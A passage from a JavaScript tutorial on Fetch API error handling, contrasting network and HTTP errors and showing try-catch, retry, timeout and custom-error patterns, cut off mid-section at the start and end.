 * @param {Response} response - The fetch response
 * @returns {Promise<Object>} - Parsed JSON data
 */
async function extractAndValidateJSON(response) {
  const data = await response.json(); // Body consumed here
  
  if (!data || typeof data !== 'object') {
    throw new Error('Invalid JSON structure');
  }
  
  return data;
}
```

---

# Error Handling

## Network Errors vs HTTP Errors

Network errors and HTTP errors represent fundamentally different failure modes in the Fetch API, each with distinct characteristics, handling requirements, and implications for application behavior.

## Fundamental Distinction

### Network Errors

Network errors occur when the HTTP request cannot be completed at the network level. The Fetch API **rejects the promise** when network errors occur:

```javascript
fetch('https://api.example.com/data')
  .then(response => {
    // This block never executes on network error
  })
  .catch(error => {
    // Network errors land here
    console.error('Network error:', error);
  });
```

### HTTP Errors

HTTP errors occur when the server successfully responds but returns an error status code (4xx, 5xx). The Fetch API **resolves the promise** with a Response object:

```javascript
fetch('https://api.example.com/data')
  .then(response => {
    // This executes even for 404, 500, etc.
    console.log(response.status); // 404, 500, etc.
    if (!response.ok) {
      throw new Error(`HTTP error: ${response.status}`);
    }
    return response.json();
  })
  .catch(error => {
    // Only explicit throws or network errors land here
  });
```

## Network Error Scenarios

### Connection Failures

```javascript
// Server unreachable, DNS failure, no internet connection
fetch('https://nonexistent-domain-12345.com/api')
  .catch(error => {
    console.error(error.message); // "Failed to fetch" or similar
  });
```

### CORS Violations

```javascript
// Cross-origin request blocked by CORS policy
fetch('https://api.different-origin.com/data')
  .catch(error => {
    // CORS violations manifest as network errors
    console.error('CORS error:', error);
  });
```

### Request Timeout

```javascript
// AbortController triggers network error
const controller = new AbortController();
setTimeout(() => controller.abort(), 5000);

fetch('https://slow-api.com/data', { signal: controller.signal })
  .catch(error => {
    if (error.name === 'AbortError') {
      console.error('Request timed out');
    }
  });
```

### TLS/SSL Certificate Issues

```javascript
// Invalid or expired SSL certificates
fetch('https://expired-cert.example.com/data')
  .catch(error => {
    // Certificate errors appear as network errors
    console.error('Certificate error:', error);
  });
```

### Network Stack Failures

- Protocol errors
- Connection reset by peer
- Network interface down
- Proxy configuration issues
- Firewall blocking

## HTTP Error Scenarios

### Client Errors (4xx)

```javascript
fetch('https://api.example.com/users/99999')
  .then(response => {
    console.log(response.status); // 404
    console.log(response.ok); // false
    console.log(response.statusText); // "Not Found"
    
    // Still have full access to response
    return response.json(); // May contain error details
  })
  .then(errorBody => {
    console.log(errorBody); // { error: "User not found" }
  });
```

Common 4xx codes:

- **400 Bad Request**: Malformed request syntax
- **401 Unauthorized**: Authentication required
- **403 Forbidden**: Authenticated but insufficient permissions
- **404 Not Found**: Resource doesn't exist
- **405 Method Not Allowed**: Wrong HTTP method
- **409 Conflict**: Request conflicts with server state
- **422 Unprocessable Entity**: Valid syntax but semantic errors
- **429 Too Many Requests**: Rate limit exceeded

### Server Errors (5xx)

```javascript
fetch('https://api.example.com/data')
  .then(response => {
    console.log(response.status); // 500, 502, 503, etc.
    console.log(response.ok); // false
    
    // Response object fully accessible
    return response.text(); // May contain error page HTML
  });
```

Common 5xx codes:

- **500 Internal Server Error**: Generic server failure
- **502 Bad Gateway**: Invalid response from upstream server
- **503 Service Unavailable**: Server temporarily unavailable
- **504 Gateway Timeout**: Upstream server timeout
- **507 Insufficient Storage**: Server out of space

## Response Object Characteristics

### Network Error: No Response Object

```javascript
fetch(url)
  .then(response => {
    // Never reaches here on network error
  })
  .catch(error => {
    console.log(error.message); // Error message
    console.log(response); // ReferenceError: response is not defined
  });
```

### HTTP Error: Valid Response Object

```javascript
fetch(url)
  .then(response => {
    console.log(response.status); // 404, 500, etc.
    console.log(response.headers); // Headers object available
    console.log(response.type); // "basic", "cors", etc.
    console.log(response.ok); // false for errors
    console.log(response.body); // ReadableStream available
    
    // Can read response body
    return response.json();
  });
```

## The `response.ok` Property

The `ok` property is only relevant for HTTP errors, as it doesn't exist during network errors:

```javascript
fetch(url)
  .then(response => {
    // response.ok is true for status 200-299
    // response.ok is false for status <200 or ≥300
    
    if (!response.ok) {
      // This is an HTTP error
      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    }
    
    return response.json();
  })
  .catch(error => {
    // Catches both:
    // 1. Network errors (promise rejection)
    // 2. HTTP errors (explicitly thrown above)
  });
```

## Error Detection Patterns

### Basic Pattern

```javascript
async function fetchData(url) {
  try {
    const response = await fetch(url);
    
    // Check for HTTP errors
    if (!response.ok) {
      throw new Error(`HTTP error: ${response.status}`);
    }
    
    return await response.json();
  } catch (error) {
    // Handles both network and HTTP errors
    console.error('Request failed:', error);
    throw error;
  }
}
```

### Distinguishing Error Types

```javascript
async function fetchWithErrorType(url) {
  let response;
  
  try {
    response = await fetch(url);
  } catch (error) {
    // Definitely a network error
    console.error('Network error:', error.message);
    throw { type: 'network', originalError: error };
  }
  
  // If we reach here, we have a response
  if (!response.ok) {
    // HTTP error
    const errorBody = await response.text();
    throw {
      type: 'http',
      status: response.status,
      statusText: response.statusText,
      body: errorBody
    };
  }
  
  return await response.json();
}
```

### Comprehensive Error Handler

```javascript
async function robustFetch(url, options = {}) {
  let response;
  let networkError = false;
  
  try {
    response = await fetch(url, options);
  } catch (error) {
    networkError = true;
    
    // Classify network error
    if (error.name === 'AbortError') {
      throw {
        type: 'abort',
        message: 'Request was aborted',
        retryable: false
      };
    }
    
    if (error.message.includes('CORS')) {
      throw {
        type: 'cors',
        message: 'CORS policy violation',
        retryable: false
      };
    }
    
    throw {
      type: 'network',
      message: error.message,
      retryable: true,
      originalError: error
    };
  }
  
  // HTTP error handling
  if (!response.ok) {
    const contentType = response.headers.get('content-type');
    let errorBody;
    
    if (contentType?.includes('application/json')) {
      errorBody = await response.json();
    } else {
      errorBody = await response.text();
    }
    
    throw {
      type: 'http',
      status: response.status,
      statusText: response.statusText,
      body: errorBody,
      retryable: response.status >= 500 || response.status === 429,
      headers: Object.fromEntries(response.headers.entries())
    };
  }
  
  return response;
}
```

## Retry Logic Implications

### Network Errors: Generally Retryable

```javascript
async function fetchWithNetworkRetry(url, maxRetries = 3) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetch(url);
      
      if (!response.ok) {
        throw new Error(`HTTP ${response.status}`);
      }
      
      return await response.json();
    } catch (error) {
      const isLastAttempt = i === maxRetries - 1;
      
      // Check if it's a network error (no response object exists)
      const isNetworkError = !error.message.startsWith('HTTP');
      
      if (isNetworkError && !isLastAttempt) {
        const delay = Math.pow(2, i) * 1000; // Exponential backoff
        await new Promise(resolve => setTimeout(resolve, delay));
        continue;
      }
      
      throw error;
    }
  }
}
```

### HTTP Errors: Selectively Retryable

```javascript
async function fetchWithSmartRetry(url, maxRetries = 3) {
  const retryableStatuses = new Set([408, 429, 500, 502, 503, 504]);
  
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetch(url);
      
      if (!response.ok) {
        // Some HTTP errors should not be retried
        if (!retryableStatuses.has(response.status)) {
          throw new Error(`HTTP ${response.status}: Not retryable`);
        }
        
        // Handle rate limiting
        if (response.status === 429) {
          const retryAfter = response.headers.get('Retry-After');
          const delay = retryAfter ? parseInt(retryAfter) * 1000 : 60000;
          await new Promise(resolve => setTimeout(resolve, delay));
          continue;
        }
        
        // Retry server errors
        if (i < maxRetries - 1) {
          const delay = Math.pow(2, i) * 1000;
          await new Promise(resolve => setTimeout(resolve, delay));
          continue;
        }
        
        throw new Error(`HTTP ${response.status}`);
      }
      
      return await response.json();
    } catch (error) {
      // Network errors are always retried
      if (i < maxRetries - 1 && !error.message.startsWith('HTTP')) {
        const delay = Math.pow(2, i) * 1000;
        await new Promise(resolve => setTimeout(resolve, delay));
        continue;
      }
      
      throw error;
    }
  }
}
```

## Error Response Body Access

### Network Errors: No Body

```javascript
fetch(url)
  .catch(error => {
    // No response object exists
    console.log(error.message); // Generic error message
    // Cannot access: status, headers, body
  });
```

### HTTP Errors: Body Available

```javascript
fetch(url)
  .then(async response => {
    if (!response.ok) {
      // Can read error details from server
      const errorData = await response.json();
      
      console.log(errorData);
      // {
      //   error: "Validation failed",
      //   fields: { email: "Invalid format" }
      // }
      
      throw new Error(errorData.error);
    }
  });
```

## User Experience Implications

### Network Error Messages

Network errors provide limited information to users:

```javascript
fetch(url)
  .catch(error => {
    // Generic messages like:
    // - "Failed to fetch"
    // - "Network request failed"
    // - "TypeError: NetworkError when attempting to fetch resource"
    
    // User-friendly handling
    displayError('Unable to connect. Please check your internet connection.');
  });
```

### HTTP Error Messages

HTTP errors allow detailed user feedback:

```javascript
fetch(url)
  .then(async response => {
    if (!response.ok) {
      const errorData = await response.json();
      
      switch (response.status) {
        case 400:
          displayError(`Invalid request: ${errorData.message}`);
          break;
        case 401:
          displayError('Please log in to continue');
          redirectToLogin();
          break;
        case 403:
          displayError('You don\'t have permission to access this resource');
          break;
        case 404:
          displayError('The requested resource was not found');
          break;
        case 429:
          displayError('Too many requests. Please try again later');
          break;
        case 500:
          displayError('Server error. Our team has been notified');
          break;
        default:
          displayError(`An error occurred: ${response.statusText}`);
      }
    }
  });
```

## Logging and Monitoring

### Network Error Logging

```javascript
async function fetchWithLogging(url) {
  try {
    const response = await fetch(url);
    
    if (!response.ok) {
      // Log HTTP errors with full context
      logger.error('HTTP error', {
        url,
        status: response.status,
        statusText: response.statusText,
        headers: Object.fromEntries(response.headers.entries()),
        timestamp: new Date().toISOString()
      });
    }
    
    return response;
  } catch (error) {
    // Log network errors with available information
    logger.error('Network error', {
      url,
      errorMessage: error.message,
      errorName: error.name,
      stack: error.stack,
      timestamp: new Date().toISOString()
    });
    
    throw error;
  }
}
```

## Testing Considerations

### Simulating Network Errors

```javascript
// Using Service Workers or network mocking libraries
async function simulateNetworkError() {
  // Mock fetch to reject promise
  global.fetch = jest.fn(() => 
    Promise.reject(new TypeError('Failed to fetch'))
  );
  
  await expect(fetchData('/api/data'))
    .rejects
    .toThrow('Failed to fetch');
}
```

### Simulating HTTP Errors

```javascript
async function simulateHTTPError() {
  // Mock fetch to resolve with error status
  global.fetch = jest.fn(() =>
    Promise.resolve({
      ok: false,
      status: 404,
      statusText: 'Not Found',
      json: () => Promise.resolve({ error: 'Resource not found' })
    })
  );
  
  const response = await fetch('/api/data');
  expect(response.ok).toBe(false);
  expect(response.status).toBe(404);
}
```

## Security Implications

### Network Errors Hide Details

CORS violations appear as generic network errors, preventing information leakage:

```javascript
// Blocked by CORS
fetch('https://api.internal-company.com/sensitive-data')
  .catch(error => {
    // Error message is generic, doesn't reveal:
    // - Whether the resource exists
    // - What the actual response was
    // - Server configuration details
    console.error(error.message); // "Failed to fetch"
  });
```

### HTTP Errors Expose Information

HTTP errors reveal that the endpoint exists and how it responded:

```javascript
fetch('https://api.example.com/sensitive-data')
  .then(response => {
    if (response.status === 401) {
      // Confirms: endpoint exists, requires auth
    }
    if (response.status === 403) {
      // Confirms: endpoint exists, user lacks permission
    }
    if (response.status === 404) {
      // Confirms: endpoint doesn't exist (or pretends not to)
    }
  });
```

## Common Misconceptions

### Misconception: All Fetch Failures Are Network Errors

**Reality**: HTTP error responses (4xx, 5xx) resolve the promise successfully.

### Misconception: `response.ok` Exists for All Errors

**Reality**: Network errors reject the promise before a Response object is created.

### Misconception: Network Errors Always Mean "No Internet"

**Reality**: CORS violations, SSL errors, timeouts, and DNS failures all manifest as network errors.

### Misconception: HTTP 404 Throws an Error

**Reality**: 404 returns a valid Response object with `ok: false` and `status: 404`.

---

## Try-Catch Patterns with fetch()

The fetch API requires careful error handling because it only rejects on network failures, not HTTP error status codes. Understanding comprehensive try-catch patterns is essential for robust applications.

### Basic Network Error Handling

The fetch promise only rejects for network-level failures (no internet connection, DNS lookup failure, request blocked by browser, etc.). HTTP error statuses like 404 or 500 return resolved promises.

```javascript
try {
  const response = await fetch('https://api.example.com/data');
  console.log('Request succeeded');
} catch (error) {
  // Only catches network failures, not HTTP errors
  console.error('Network error:', error.message);
}
```

### HTTP Status Error Handling

Since fetch doesn't reject on HTTP errors, you must explicitly check `response.ok` or `response.status`:

```javascript
try {
  const response = await fetch('https://api.example.com/data');
  
  if (!response.ok) {
    throw new Error(`HTTP error! status: ${response.status}`);
  }
  
  const data = await response.json();
  return data;
} catch (error) {
  // Catches both network errors and thrown HTTP errors
  console.error('Request failed:', error.message);
}
```

### Parsing Error Handling

JSON parsing can fail if the response body isn't valid JSON. This requires separate error handling:

```javascript
try {
  const response = await fetch('https://api.example.com/data');
  
  if (!response.ok) {
    throw new Error(`HTTP error! status: ${response.status}`);
  }
  
  try {
    const data = await response.json();
    return data;
  } catch (parseError) {
    throw new Error(`JSON parse error: ${parseError.message}`);
  }
} catch (error) {
  console.error('Request failed:', error.message);
}
```

### Comprehensive Pattern with Error Types

Distinguish between different error categories for appropriate handling:

```javascript
async function fetchData(url) {
  try {
    const response = await fetch(url);
    
    if (!response.ok) {
      const error = new Error(`HTTP ${response.status}`);
      error.status = response.status;
      error.response = response;
      throw error;
    }
    
    try {
      return await response.json();
    } catch (parseError) {
      const error = new Error('Invalid JSON response');
      error.cause = parseError;
      error.originalError = parseError;
      throw error;
    }
  } catch (error) {
    if (error.name === 'TypeError' && !error.status) {
      // Network-level error
      throw new Error(`Network error: ${error.message}`);
    }
    throw error; // Re-throw HTTP or parse errors
  }
}
```

### Timeout Pattern

fetch doesn't have built-in timeout support. Combine with AbortController:

```javascript
async function fetchWithTimeout(url, timeout = 5000) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeout);
  
  try {
    const response = await fetch(url, {
      signal: controller.signal
    });
    
    clearTimeout(timeoutId);
    
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    return await response.json();
  } catch (error) {
    clearTimeout(timeoutId);
    
    if (error.name === 'AbortError') {
      throw new Error(`Request timeout after ${timeout}ms`);
    }
    throw error;
  }
}
```

### Retry Pattern with Exponential Backoff

```javascript
async function fetchWithRetry(url, options = {}, maxRetries = 3) {
  let lastError;
  
  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      const response = await fetch(url, options);
      
      if (!response.ok) {
        // Don't retry client errors (4xx), only server errors (5xx)
        if (response.status >= 400 && response.status < 500) {
          throw new Error(`Client error: ${response.status}`);
        }
        throw new Error(`Server error: ${response.status}`);
      }
      
      return await response.json();
    } catch (error) {
      lastError = error;
      
      // Don't retry on client errors
      if (error.message.includes('Client error')) {
        throw error;
      }
      
      if (attempt < maxRetries) {
        const delay = Math.pow(2, attempt) * 1000; // Exponential backoff
        await new Promise(resolve => setTimeout(resolve, delay));
      }
    }
  }
  
  throw new Error(`Failed after ${maxRetries} retries: ${lastError.message}`);
}
```

### Graceful Degradation Pattern

Handle errors with fallback responses:

```javascript
async function fetchWithFallback(url, fallbackData) {
  try {
    const response = await fetch(url);
    
    if (!response.ok) {
      console.warn(`HTTP ${response.status}, using fallback`);
      return fallbackData;
    }
    
    try {
      return await response.json();
    } catch (parseError) {
      console.warn('Parse error, using fallback');
      return fallbackData;
    }
  } catch (networkError) {
    console.warn('Network error, using fallback');
    return fallbackData;
  }
}
```

### Error Context Enrichment

Add contextual information to errors for better debugging:

```javascript
async function fetchWithContext(url, options = {}) {
  const requestId = crypto.randomUUID();
  const startTime = Date.now();
  
  try {
    const response = await fetch(url, options);
    const duration = Date.now() - startTime;
    
    if (!response.ok) {
      const error = new Error(`HTTP ${response.status}: ${response.statusText}`);
      error.context = {
        requestId,
        url,
        method: options.method || 'GET',
        status: response.status,
        duration,
        headers: Object.fromEntries(response.headers.entries())
      };
      throw error;
    }
    
    return await response.json();
  } catch (error) {
    if (!error.context) {
      error.context = {
        requestId,
        url,
        method: options.method || 'GET',
        duration: Date.now() - startTime
      };
    }
    throw error;
  }
}
```

### Parallel Requests Error Handling

Handle errors when fetching multiple resources simultaneously:

```javascript
async function fetchMultiple(urls) {
  const results = await Promise.allSettled(
    urls.map(async url => {
      try {
        const response = await fetch(url);
        if (!response.ok) {
          throw new Error(`HTTP ${response.status}`);
        }
        return await response.json();
      } catch (error) {
        return { error: error.message, url };
      }
    })
  );
  
  const succeeded = results
    .filter(r => r.status === 'fulfilled' && !r.value.error)
    .map(r => r.value);
    
  const failed = results
    .filter(r => r.status === 'rejected' || r.value?.error)
    .map(r => r.reason || r.value);
  
  return { succeeded, failed };
}
```

### Custom Error Classes

Create specific error types for different failure scenarios:

```javascript
class FetchError extends Error {
  constructor(message, status, response) {
    super(message);
    this.name = 'FetchError';
    this.status = status;
    this.response = response;
  }
}

class NetworkError extends Error {
  constructor(message, originalError) {
    super(message);
    this.name = 'NetworkError';
    this.originalError = originalError;
  }
}

class ParseError extends Error {
  constructor(message, originalError) {
    super(message);
    this.name = 'ParseError';
    this.originalError = originalError;
  }
}

async function fetchTyped(url) {
  try {
    const response = await fetch(url);
    
    if (!response.ok) {
      throw new FetchError(
        `Request failed with status ${response.status}`,
        response.status,
        response
      );
    }
    
    try {
      return await response.json();
    } catch (parseError) {
      throw new ParseError('Failed to parse JSON', parseError);
    }
  } catch (error) {
    if (error instanceof FetchError || error instanceof ParseError) {
      throw error;
    }
    throw new NetworkError('Network request failed', error);
  }
}

// Usage with specific handling
try {
  await fetchTyped('https://api.example.com/data');
} catch (error) {
  if (error instanceof FetchError) {
    console.error('HTTP error:', error.status);
  } else if (error instanceof NetworkError) {
    console.error('Network failure:', error.message);
  } else if (error instanceof ParseError) {
    console.error('Invalid response format');
  }
}
```

### AbortController Error Handling

Properly handle cancellation errors:

```javascript
async function fetchCancellable(url, controller) {
  try {
    const response = await fetch(url, {
      signal: controller.signal
    });
    
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    return await response.json();
  } catch (error) {
    if (error.name === 'AbortError') {
      console.log('Request was cancelled');
      return null; // Or handle cancellation differently
    }
    throw error; // Re-throw other errors
  }
}
```

### Finally Block Usage

Ensure cleanup always occurs:

```javascript
async function fetchWithCleanup(url) {
  let controller;
  
  try {
    controller = new AbortController();
    
    const response = await fetch(url, {
      signal: controller.signal
    });
    
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    return await response.json();
  } catch (error) {
    console.error('Request failed:', error.message);
    throw error;
  } finally {
    // Cleanup always runs
    controller = null;
    console.log('Request cleanup completed');
  }
}
```

### Error Boundary Pattern for UI

Centralized error handling for UI applications:

```javascript
class FetchService {
  constructor(onError) {
    this.onError = onError;
  }
  
  async fetch(url, options = {}) {
    try {
      const response = await fetch(url, options);
      
      if (!response.ok) {
        const error = new Error(`HTTP ${response.status}`);
        error.status = response.status;
        throw error;
      }
      
      return await response.json();
    } catch (error) {
      // Centralized error handling
      this.onError(error, url);
      throw error;
    }
  }
}

// Usage
const service = new FetchService((error, url) => {
  // Log to monitoring service
  console.error('Fetch error:', { error: error.message, url });
  
  // Show user notification
  if (error.status >= 500) {
    showNotification('Server error, please try again');
  } else if (error.name === 'NetworkError') {
    showNotification('Connection problem, check your network');
  }
});
```

---

## Promise Rejection Handling in Fetch API

The Fetch API returns a Promise, and understanding when and why it rejects is critical for robust error handling. Unlike traditional HTTP libraries, Fetch has specific rejection behavior that differs from common expectations.

### When Fetch Rejects

The Fetch Promise **only rejects** in these scenarios:

1. **Network failures** - Cannot reach the server at all
2. **CORS violations** - Cross-origin request blocked by browser
3. **Request abortion** - Request cancelled via AbortController
4. **Invalid schemes** - Using unsupported URL schemes
5. **Browser security policies** - Content Security Policy or mixed content blocks

### When Fetch Does NOT Reject

Critically, Fetch **does not reject** for HTTP error status codes:

```javascript
// This will NOT reject even though 404 is an error
const response = await fetch('https://example.com/nonexistent');
console.log(response.status); // 404
console.log(response.ok); // false
// No rejection occurred - promise resolved successfully
```

HTTP status codes like 400, 404, 500, 503, etc. result in a **resolved Promise** with `response.ok` set to `false`.

### Basic Error Handling Pattern

```javascript
try {
  const response = await fetch(url);
  
  if (!response.ok) {
    throw new Error(`HTTP error! status: ${response.status}`);
  }
  
  const data = await response.json();
  return data;
} catch (error) {
  // Handles network errors AND manually thrown HTTP errors
  console.error('Fetch failed:', error);
}
```

### Network Failure Handling

Network failures trigger Promise rejection:

```javascript
async function fetchWithNetworkErrorHandling(url) {
  try {
    const response = await fetch(url);
    return response;
  } catch (error) {
    // Network-level failures land here
    console.error('Network error:', error.message);
    
    // [Inference] Common network error messages include:
    // - "Failed to fetch" (generic network failure)
    // - "NetworkError when attempting to fetch resource"
    // - "Load failed" (iOS Safari)
    
    throw error;
  }
}
```

### CORS Rejection

CORS violations cause Promise rejection:

```javascript
async function fetchCrossOrigin(url) {
  try {
    const response = await fetch(url);
    return await response.json();
  } catch (error) {
    // CORS errors appear here
    if (error.message.includes('CORS') || 
        error.message.includes('fetch')) {
      console.error('CORS policy blocked request');
      console.error('Server must include proper CORS headers');
    }
    throw error;
  }
}
```

[Inference] CORS errors typically show messages like "Failed to fetch" or reference CORS policies, but the exact message varies by browser.

### Abort Signal Rejection

Aborted requests trigger rejection with an `AbortError`:

```javascript
async function fetchWithTimeout(url, timeoutMs = 5000) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeoutMs);
  
  try {
    const response = await fetch(url, { signal: controller.signal });
    clearTimeout(timeoutId);
    return response;
  } catch (error) {
    clearTimeout(timeoutId);
    
    if (error.name === 'AbortError') {
      console.error('Request aborted or timed out');
      throw new Error('Request timeout');
    }
    
    throw error;
  }
}
```

### Comprehensive Error Classification

Distinguish between different error types:

```javascript
async function fetchWithDetailedErrors(url) {
  try {
    const response = await fetch(url);
    
    if (!response.ok) {
      // HTTP error - not a rejection
      const error = new Error(`HTTP ${response.status}: ${response.statusText}`);
      error.response = response;
      error.status = response.status;
      throw error;
    }
    
    return await response.json();
  } catch (error) {
    // Classify the error type
    if (error.name === 'AbortError') {
      console.error('Request was aborted');
      error.errorType = 'ABORT';
    } else if (error.response) {
      console.error('HTTP error:', error.status);
      error.errorType = 'HTTP';
    } else if (error.message.includes('Failed to fetch') || 
               error.message.includes('NetworkError')) {
      console.error('Network failure');
      error.errorType = 'NETWORK';
    } else if (error instanceof TypeError) {
      console.error('Type error - possibly CORS or invalid URL');
      error.errorType = 'TYPE';
    } else if (error instanceof SyntaxError) {
      console.error('JSON parsing error');
      error.errorType = 'PARSE';
    } else {
      console.error('Unknown error');
      error.errorType = 'UNKNOWN';
    }
    
    throw error;
  }
}
```

### HTTP Status Code Handling

Create explicit handlers for different status ranges:

```javascript
async function fetchWithStatusHandling(url) {
  try {
    const response = await fetch(url);
    
    // Handle specific status codes
    if (response.status === 401) {
      throw new Error('Authentication required');
    }
    
    if (response.status === 403) {
      throw new Error('Access forbidden');
    }
    
    if (response.status === 404) {
      throw new Error('Resource not found');
    }
    
    if (response.status >= 500) {
      throw new Error('Server error - please retry later');
    }
    
    if (!response.ok) {
      throw new Error(`Request failed: ${response.status}`);
    }
    
    return await response.json();
  } catch (error) {
    console.error('Request error:', error.message);
    throw error;
  }
}
```

### Parsing Errors

JSON parsing can fail after successful fetch:

```javascript
async function fetchJSON(url) {
  let response;
  
  try {
    response = await fetch(url);
    
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}`);
    }
    
    // Parsing happens AFTER successful fetch
    const data = await response.json();
    return data;
  } catch (error) {
    if (error instanceof SyntaxError) {
      console.error('Invalid JSON response');
      // [Inference] Response was successful but body wasn't valid JSON
      if (response) {
        const text = await response.text();
        console.error('Response body:', text.substring(0, 200));
      }
    }
    throw error;
  }
}
```

### Retry Logic with Exponential Backoff

Handle transient failures with retry mechanism:

```javascript
async function fetchWithRetry(url, options = {}, maxRetries = 3) {
  let lastError;
  
  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      const response = await fetch(url, options);
      
      // Don't retry on client errors (4xx)
      if (response.status >= 400 && response.status < 500) {
        throw new Error(`Client error: ${response.status}`);
      }
      
      if (!response.ok) {
        // Retry on server errors (5xx)
        throw new Error(`Server error: ${response.status}`);
      }
      
      return response;
    } catch (error) {
      lastError = error;
      
      // Don't retry on abort errors
      if (error.name === 'AbortError') {
        throw error;
      }
      
      if (attempt < maxRetries) {
        // Exponential backoff: 1s, 2s, 4s
        const delay = Math.pow(2, attempt) * 1000;
        console.log(`Retry ${attempt + 1}/${maxRetries} after ${delay}ms`);
        await new Promise(resolve => setTimeout(resolve, delay));
      }
    }
  }
  
  throw new Error(`Failed after ${maxRetries} retries: ${lastError.message}`);
}
```

### Unhandled Rejection Protection

Prevent unhandled promise rejections:

```javascript
// Global handler for unhandled rejections
window.addEventListener('unhandledrejection', event => {
  console.error('Unhandled promise rejection:', event.reason);
  
  // [Inference] Check if it's a fetch-related error
  if (event.reason?.message?.includes('fetch') || 
      event.reason?.message?.includes('Failed to fetch')) {
    console.error('Unhandled fetch error detected');
    // Log to error tracking service, show user notification, etc.
  }
  
  // Prevent default browser handling
  event.preventDefault();
});

// Always handle fetch promises
fetch(url)
  .then(response => response.json())
  .catch(error => console.error('Fetch error:', error));
```

### Async/Await vs Promise Chain

Both patterns work, but async/await provides clearer error handling:

```javascript
// Promise chain approach
function fetchDataPromiseChain(url) {
  return fetch(url)
    .then(response => {
      if (!response.ok) {
        throw new Error(`HTTP ${response.status}`);
      }
      return response.json();
    })
    .catch(error => {
      console.error('Error:', error);
      throw error;
    });
}

// Async/await approach (recommended)
async function fetchDataAsyncAwait(url) {
  try {
    const response = await fetch(url);
    
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}`);
    }
    
    return await response.json();
  } catch (error) {
    console.error('Error:', error);
    throw error;
  }
}
```

### Error Recovery Strategies

Implement fallback mechanisms:

```javascript
async function fetchWithFallback(primaryUrl, fallbackUrl) {
  try {
    return await fetch(primaryUrl);
  } catch (primaryError) {
    console.warn('Primary endpoint failed, trying fallback');
    
    try {
      return await fetch(fallbackUrl);
    } catch (fallbackError) {
      console.error('Both endpoints failed');
      throw new Error('All endpoints unavailable');
    }
  }
}
```

### Response Error Details

Extract detailed error information from response:

```javascript
async function fetchWithErrorDetails(url) {
  try {
    const response = await fetch(url);
    
    if (!response.ok) {
      // Try to get error details from response body
      let errorMessage = `HTTP ${response.status}: ${response.statusText}`;
      
      try {
        const errorData = await response.json();
        if (errorData.message) {
          errorMessage = errorData.message;
        }
        if (errorData.errors) {
          errorMessage += `\nDetails: ${JSON.stringify(errorData.errors)}`;
        }
      } catch (parseError) {
        // Response body wasn't JSON, try text
        try {
          const errorText = await response.text();
          if (errorText) {
            errorMessage += `\n${errorText.substring(0, 200)}`;
          }
        } catch (textError) {
          // Unable to read response body
        }
      }
      
      const error = new Error(errorMessage);
      error.status = response.status;
      error.response = response;
      throw error;
    }
    
    return await response.json();
  } catch (error) {
    if (error.response) {
      // HTTP error with details
      console.error('HTTP Error:', error.message);
    } else {
      // Network error
      console.error('Network Error:', error.message);
    }
    throw error;
  }
}
```

### Timeout Implementation

Implement request timeouts using AbortController:

```javascript
async function fetchWithAbortTimeout(url, timeoutMs = 5000) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeoutMs);
  
  try {
    const response = await fetch(url, {
      signal: controller.signal
    });
    
    clearTimeout(timeoutId);
    
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}`);
    }
    
    return await response.json();
  } catch (error) {
    clearTimeout(timeoutId);
    
    if (error.name === 'AbortError') {
      throw new Error(`Request timeout after ${timeoutMs}ms`);
    }
    
    throw error;
  }
}
```

### Multiple Concurrent Requests

Handle rejection in parallel requests:

```javascript
async function fetchMultipleWithErrors(urls) {
  const results = await Promise.allSettled(
    urls.map(url => fetch(url).then(r => {
      if (!r.ok) throw new Error(`HTTP ${r.status}`);
      return r.json();
    }))
  );
  
  const successful = [];
  const failed = [];
  
  results.forEach((result, index) => {
    if (result.status === 'fulfilled') {
      successful.push({ url: urls[index], data: result.value });
    } else {
      failed.push({ url: urls[index], error: result.reason });
    }
  });
  
  if (failed.length > 0) {
    console.warn(`${failed.length} requests failed:`, failed);
  }
  
  return { successful, failed };
}
```

### Type-Safe Error Handling

Create custom error classes:

```javascript
class FetchError extends Error {
  constructor(message, response = null, cause = null) {
    super(message);
    this.name = 'FetchError';
    this.response = response;
    this.cause = cause;
  }
}

class NetworkError extends FetchError {
  constructor(message, cause) {
    super(message, null, cause);
    this.name = 'NetworkError';
  }
}

class HTTPError extends FetchError {
  constructor(response) {
    super(`HTTP ${response.status}: ${response.statusText}`, response);
    this.name = 'HTTPError';
    this.status = response.status;
  }
}

async function fetchTyped(url) {
  try {
    const response = await fetch(url);
    
    if (!response.ok) {
      throw new HTTPError(response);
    }
    
    return await response.json();
  } catch (error) {
    if (error instanceof HTTPError) {
      console.error('HTTP error:', error.status);
      throw error;
    }
    
    if (error.name === 'AbortError') {
      throw error;
    }
    
    // Network or other error
    throw new NetworkError('Network request failed', error);
  }
}
```

### Debugging Promise Rejections

Log detailed information for debugging:

```javascript
async function fetchWithDebugInfo(url, options = {}) {
  const startTime = performance.now();
  
  console.log('Fetch started:', {
    url,
    method: options.method || 'GET',
    timestamp: new Date().toISOString()
  });
  
  try {
    const response = await fetch(url, options);
    const duration = performance.now() - startTime;
    
    console.log('Fetch completed:', {
      url,
      status: response.status,
      ok: response.ok,
      redirected: response.redirected,
      duration: `${duration.toFixed(2)}ms`
    });
    
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}`);
    }
    
    return response;
  } catch (error) {
    const duration = performance.now() - startTime;
    
    console.error('Fetch failed:', {
      url,
      error: error.message,
      name: error.name,
      duration: `${duration.toFixed(2)}ms`,
      stack: error.stack
    });
    
    throw error;
  }
}
```

### Common Pitfalls

#### Not Checking response.ok

```javascript
// ❌ Wrong - treats 404 as success
const data = await fetch(url).then(r => r.json());

// ✓ Correct - checks response status
const response = await fetch(url);
if (!response.ok) throw new Error(`HTTP ${response.status}`);
const data = await response.json();
```

#### Forgetting to Handle JSON Parsing

```javascript
